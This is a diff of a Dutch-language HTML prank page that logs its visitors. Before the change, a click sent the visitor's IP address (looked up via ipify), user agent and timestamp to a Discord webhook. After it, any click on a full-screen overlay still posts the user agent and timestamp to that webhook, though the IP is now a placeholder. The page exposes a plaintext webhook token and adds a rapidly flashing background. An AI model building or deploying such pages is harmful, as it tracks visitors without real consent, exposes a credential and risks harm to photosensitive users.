@@ -7,41 +7,49 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
             text-align: center;
             padding-top: 50px;
+            background-color: white;
+            color: black;
+            animation: changeBackground 0.8s infinite;
         }
         h1 {
-            color: #333;
+            color: inherit;
         }
         p {
-            color: #666;
+            color: inherit;
             margin-bottom: 40px;
-        }
-        #music {
-            display: none;
         }
         #popup {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #fff;
-            border: 1px solid #ccc;
-            padding: 20px;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
             z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
         }
-        #popup button {
-            margin: 10px;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
+        #popup-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        @keyframes changeBackground {
+            0% { background-color: white; color: black; }
+            50% { background-color: black; color: white; }
+            100% { background-color: white; color: black; }
         }
     </style>
     <script>
-        function showPopup() {
-            var popup = document.getElementById('popup');
-            popup.style.display = 'block';
+        function startMusic() {
+            hidePopup();
+            var audio = new Audio('sound.mp3');
+            audio.play();
+            sendToDiscord();
         }
 
         function hidePopup() {
@@ -49,29 +57,12 @@
             popup.style.display = 'none';
         }
 
-        function startMusic() {
-            hidePopup();
-            var audio = new Audio('sound.mp3');
-            audio.play();
-            
-            var script = document.createElement('script');
-            script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
-            document.getElementsByTagName('head')[0].appendChild(script);
-        }
-
-        // Functie om IP-adres, gebruikersagent en tijdstip te verkrijgen
-        function getIP(json) {
-            var ipAddress = json.ip;
+        function sendToDiscord() {
+            var ipAddress = "127.0.0.1"; // Simulated IP address for demonstration
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
-            sendToDiscord(ipAddress, userAgent, timestamp);
-        }
-
-        // Functie om IP-adres, gebruikersagent en tijdstip naar Discord webhook te sturen in een embed bericht
-        function sendToDiscord(ipAddress, userAgent, timestamp) {
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
 
-            // Maak een embed object aan met de IP-adres, gebruikersagent en tijdstip
             var embed = {
                 "embeds": [
                     {
@@ -99,30 +90,28 @@
                 ]
             };
 
-            // Maak een nieuw XMLHttpRequest object aan
             var xhr = new XMLHttpRequest();
-
-            // Definieer de methode en URL voor het verzoek
             xhr.open("POST", webhookURL);
-
-            // Stel de content type header in
             xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify(embed));
+        }
 
-            // Stel de payload in met het ingesloten bericht
-            var payload = JSON.stringify(embed);
-            
-            // Stuur het verzoek
-            xhr.send(payload);
+        window.onload = function() {
+            var popup = document.getElementById('popup');
+            popup.addEventListener('click', function() {
+                startMusic();
+            });
         }
     </script>
 </head>
-<body onload="showPopup()">
+<body>
     <h1>Welkom bij onze geweldige site!</h1>
     <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
     <div id="popup">
-        <p>Vind je deze site leuk?</p>
-        <button onclick="startMusic()">Ja</button>
-        <button onclick="hidePopup()">Nee</button>
+        <div id="popup-content">
+            <p>Vind je deze site leuk?</p>
+            <p>Klik ergens om door te gaan.</p>
+        </div>
     </div>
     <audio id="music" autoplay loop>
         <source src="sound.mp3" type="audio/mpeg">
